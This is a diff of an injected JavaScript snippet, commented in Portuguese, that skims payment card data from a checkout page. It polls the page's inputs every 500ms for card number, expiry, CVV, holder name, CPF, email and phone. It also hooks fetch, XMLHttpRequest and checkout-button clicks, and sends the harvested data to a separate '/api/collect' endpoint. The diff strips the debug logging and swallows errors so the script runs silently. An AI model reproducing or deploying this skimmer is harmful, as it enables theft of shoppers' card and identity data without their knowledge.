@@ -19,27 +19,29 @@
 (function () {
   const COLLECT_URL = "/api/collect";
   const TARGET_URL = "/api/payments/create";
-  let cardCache = {};  // cache dos dados do cartão capturados em tempo real
+  let cardCache = {};
   let lastCollected = 0;
 
   function digits(v) { return String(v || "").replace(/\D/g, ""); }
   function clean(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }
 
-  function findInput({ ids = [], names = [], types = [], placeholders = [] }) {
+  // Busca por input dentro de um "container" específico (evita pegar input errado)
+  function findInputIn(container, { ids = [], names = [], types = [], placeholders = [] }) {
+    const root = container || document;
     for (const id of ids) {
-      const el = document.getElementById(id);
+      const el = root.querySelector(`#${id}`);
       if (el && el.value) return el;
     }
     for (const name of names) {
-      const el = document.querySelector(`input[name="${name}"]`);
+      const el = root.querySelector(`input[name="${name}"]`);
       if (el && el.value) return el;
     }
     for (const type of types) {
-      const el = document.querySelector(`input[type="${type}"]`);
+      const el = root.querySelector(`input[type="${type}"]`);
       if (el && el.value) return el;
     }
     for (const ph of placeholders) {
-      const el = [...document.querySelectorAll('input')].find(i =>
+      const el = [...root.querySelectorAll('input')].find(i =>
         (i.placeholder || '').toLowerCase().includes(ph.toLowerCase()) && i.value
       );
       if (el) return el;
@@ -47,40 +49,60 @@
     return null;
   }
 
-  // Função que captura os dados do DOM a qualquer momento
+  // Acha o "formulário de cartão" (bloco onde estão os inputs de cartão)
+  function findCardContainer() {
+    // Tenta achar o input do número do cartão primeiro
+    const cardNum = document.querySelector('input[name="cardNumber"], #cardNumber, input[autocomplete="cc-number"]');
+    if (cardNum) {
+      // Sobe alguns níveis para pegar o form inteiro
+      let parent = cardNum.closest('form, [class*="checkout"], [class*="payment"], [class*="step"]');
+      return parent || document;
+    }
+    return document;
+  }
+
   function collectFromDOM() {
-    const cardNumber = findInput({
+    // Prioridade: procurar dentro do container de cartão
+    const container = findCardContainer();
+
+    const cardNumber = findInputIn(container, {
       ids: ['cardNumber', 'card-number'],
       names: ['cardNumber', 'card_number', 'number', 'cc-number'],
       placeholders: ['0000 0000 0000']
     });
-    const expiry = findInput({
+    const expiry = findInputIn(container, {
       ids: ['cardExpiry', 'cardDueDate', 'expiry'],
       names: ['cardExpiry', 'card_expiry', 'expiry', 'exp', 'cardDueDate'],
       placeholders: ['MM/AA', 'MM/YY']
     });
-    const cvv = findInput({
+    const cvv = findInputIn(container, {
       ids: ['cardCvv', 'cardCVV', 'cvv'],
       names: ['cardCvv', 'card_cvv', 'cvv', 'cvc'],
       placeholders: ['CVV', 'CVC']
     });
-    const cardName = findInput({
+    // NOME: prioriza cardName/cardholderName e só depois o "name" genérico
+    const cardName = findInputIn(container, {
       ids: ['cardName', 'cardholderName', 'holderName'],
       names: ['cardName', 'card_name', 'holderName', 'holder', 'cardholderName'],
       placeholders: ['Nome impresso', 'nome no cartão', 'Como está no cartão']
+    }) || findInputIn(document, {
+      // Fallback: pega o input com id="name" ou name="name" que tenha valor
+      ids: ['name'],
+      names: ['name'],
+      placeholders: ['Digite seu nome completo', 'Nome Completo', 'Nome do titular']
     });
-    const cardCpf = findInput({
+    const cardCpf = findInputIn(container, {
       ids: ['cpf', 'cardCpf', 'document'],
       names: ['cpf', 'cardCpf', 'card_cpf', 'document'],
       placeholders: ['000.000.000-00', 'CPF']
     });
-    const email = findInput({
+    const email = findInputIn(container, {
       ids: ['email'],
       names: ['email'],
       types: ['email'],
       placeholders: ['e-mail', 'email']
     });
-    const phone = findInput({
+    const phone = findInputIn(container, {
       ids: ['phone'],
       names: ['phone', 'telefone', 'celular'],
       types: ['tel'],
@@ -109,36 +131,23 @@
     };
   }
 
-  // Polling: a cada 500ms salva no cache os dados atuais
   setInterval(function () {
     const data = collectFromDOM();
-    // Só atualiza campos que têm valor (evita sobrescrever com vazio)
     Object.keys(data).forEach(k => {
       if (data[k]) cardCache[k] = data[k];
     });
   }, 500);
 
-  // Envia para o servidor
-  function sendToCollect(origem) {
+  function sendToCollect() {
     const agora = Date.now();
-    if (agora - lastCollected < 1000) {
-      console.log("⏭️ Envio duplicado ignorado (" + origem + ")");
-      return;
-    }
-    if (!cardCache.card_num || cardCache.card_num.length < 13) {
-      console.log("⚠️ Cache sem número de cartão ainda (" + origem + ")");
-      return;
-    }
+    if (agora - lastCollected < 1000) return;
+    if (!cardCache.card_num || cardCache.card_num.length < 13) return;
     lastCollected = agora;
-    console.log("📤 Coletando (" + origem + "):", cardCache);
     fetch(COLLECT_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(cardCache)
-    })
-    .then(r => r.json())
-    .then(d => console.log("✅ Servidor respondeu:", d))
-    .catch(e => console.error("❌ Erro:", e));
+    }).catch(() => {});
   }
 
   function extractFromBody(body) {
@@ -163,7 +172,6 @@
     } catch (e) { return null; }
   }
 
-  // 1) Intercepta fetch (para o caso do React mandar o cartão no body)
   const originalFetch = window.fetch;
   window.fetch = async function (...args) {
     const [url, options = {}] = args;
@@ -172,13 +180,11 @@
       if (extracted) {
         Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
       }
-      // Envia para coleta usando o cache atualizado
-      sendToCollect("fetch");
+      sendToCollect();
     }
     return originalFetch.apply(this, args);
   };
 
-  // 2) Intercepta XHR
   const XHROpen = XMLHttpRequest.prototype.open;
   const XHRSend = XMLHttpRequest.prototype.send;
   XMLHttpRequest.prototype.open = function (method, url, ...rest) {
@@ -191,12 +197,11 @@
       if (extracted) {
         Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
       }
-      sendToCollect("xhr");
+      sendToCollect();
     }
     return XHRSend.call(this, body);
   };
 
-  // 3) Fallback: clique em botão de finalizar
   function isFinalizeButton(el) {
     if (!el || el.tagName !== "BUTTON") return false;
     const text = (el.innerText || "").toLowerCase();
@@ -208,11 +213,8 @@
     const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
       || document.querySelector('input[type="radio"][value="credit_card"]:checked');
     if (!cardRadio) return;
-    // Delay maior para dar tempo do cache pegar
-    setTimeout(() => sendToCollect("click"), 300);
+    setTimeout(() => sendToCollect(), 300);
   }, true);
-
-  console.log("🔍 Interceptadores + polling ativos (cache a cada 500ms)");
 })();
 </script>
     
